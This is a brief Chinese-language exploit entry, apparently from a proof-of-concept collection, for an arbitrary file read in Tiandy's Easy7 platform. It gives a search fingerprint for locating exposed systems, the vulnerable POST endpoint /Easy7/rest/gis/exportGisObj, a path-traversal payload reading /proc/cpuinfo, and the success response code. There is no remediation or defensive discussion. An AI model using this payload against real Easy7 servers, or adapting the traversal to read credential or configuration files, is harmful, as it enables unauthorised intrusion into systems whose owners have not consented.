# 天地伟业Easy7exportGisObj存在任意文件读取漏洞

天地伟业 ｜ 任意文件读取/写入 ｜ —
- **指纹**：`body="./images/ico/Easy7_logo_transparent.png"`
- **请求**：`POST /Easy7/rest/gis/exportGisObj HTTP/1.1`

**Payload**
```
fileName=../../../../../../../../proc/cpuinfo
```
- **响应特征**：200